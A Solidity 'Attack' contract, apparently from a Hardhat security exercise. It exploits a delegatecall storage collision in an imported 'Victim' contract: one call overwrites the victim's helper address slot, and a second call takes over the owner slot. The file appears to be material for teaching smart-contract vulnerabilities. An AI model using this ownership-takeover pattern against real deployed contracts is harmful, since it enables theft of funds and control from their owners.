// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Victim.sol";
import "hardhat/console.sol";

contract Attack {
    address public helper;
    address public owner;
    uint256 public num;

    Victim public victim;

    constructor(address _victim) {
        victim = Victim(_victim);
    }

    function setNum(uint256 _num) external returns (bool status) {
        owner = msg.sender;
        console.log(_num);
        return true;
    }

    function attack() external {
        // This is the way you typecast an address to a uint
        victim.setNum(uint256(uint160(address(this))));
        victim.setNum(1);
    }
}
